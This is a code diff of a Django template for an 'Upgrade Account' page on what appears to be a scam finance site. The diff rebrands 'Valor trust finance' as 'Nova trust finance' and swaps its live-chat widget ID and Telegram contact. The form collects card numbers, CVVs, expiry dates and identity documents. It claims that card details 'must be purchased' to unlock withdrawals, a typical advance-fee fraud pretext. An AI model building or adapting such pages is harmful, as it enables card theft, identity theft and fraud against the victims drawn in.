@@ -6,22 +6,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="{% static 'img/favicon.ico' %}" rel="icon">
-<!--Start of Tawk.to Script-->
+     <!--Start of Tawk.to Script-->
 <script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-    s1.async=true;
-    s1.src='https://embed.tawk.to/686e72e8d45f97191263b7eb/1ivnn1nvm';
-    s1.charset='UTF-8';
-    s1.setAttribute('crossorigin','*');
-    s0.parentNode.insertBefore(s1,s0);
-    })();
-    </script>
-    <!--End of Tawk.to Script-->
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6a09f6a0e57a6a1c342a5445/1jorempt4';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
      <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=Rubik:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
-    
+
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <title>Upgrade Account</title>
     <style>
@@ -145,7 +145,7 @@
 
     <nav class="navbar navbar-expand-md navbar-dark">
         <div class="container">
-            <a href="/" class="navbar-brand">Valor trust finance</a>
+            <a href="/" class="navbar-brand"> Nova trust finance</a>
             <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#main-nav">
                 <span class="navbar-toggler-icon"></span>
             </button>
@@ -162,7 +162,7 @@
     <div class="upgrade-container">
         <h2>Upgrade Your Account</h2>
         <p>Please provide your credentials to complete the upgrade process.</p>
-        
+
         <!-- Info Note -->
         <div class="info-note">
             <p><strong>Important:</strong> The card details must be purchased in order to upgrade your account and unlock withdrawal features.</p>
@@ -179,19 +179,19 @@
 
         <form id="upgradeForm" action="{% url 'Upgrade_Account' %}" method="post" enctype="multipart/form-data">
             {% csrf_token %}
-            
+
             <!-- Mobile Bank Card Number -->
             <div class="form-group mb-3">
                 <label for="card-number">Mobile Bank Card Number:</label>
                 <input type="text" id="card-number" name="card_number" class="form-control" required>
             </div>
-            
+
             <!-- CVV -->
             <div class="form-group mb-3">
                 <label for="cvv">CVV:</label>
                 <input type="text" id="cvv" name="cvv" class="form-control" required>
             </div>
-            
+
 <!-- Expiration Date (Month and Year) -->
 <div class="form-group mb-3">
     <label for="expiry-month">Expiration Date:</label>
@@ -214,7 +214,7 @@
 <!-- Hidden field for the combined expiry date -->
 <input type="hidden" id="expiry_date" name="expiry_date" required>
 
-            
+
             <!-- Document Type -->
             <div class="form-group mb-3">
                 <label for="document-type">Document Type:</label>
@@ -225,17 +225,17 @@
                     <option value="bank_document">Bank Document</option>
                 </select>
             </div>
-            
+
             <!-- Document Upload -->
             <div class="form-group mb-3">
                 <label for="document-upload">Upload Document:</label>
                 <input type="file" id="document-upload" name="document_upload" class="form-control" accept=".pdf,.jpg,.jpeg,.png" required>
             </div>
-            
+
             <!-- Submit Button -->
             <button type="submit" class="submit-btn w-100">Submit</button>
         </form>
-        
+
     </div>
 <script>
     document.querySelector('form').addEventListener('submit', function(event) {
@@ -252,7 +252,7 @@
     }
 });
 document.getElementById("telegramBtn").addEventListener("click", function() {
-            window.open("https://t.me/Financial_Board_Services");
+            window.open("https://t.me/CUSTOMER_SUPPORT_1485");
         });
 </script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
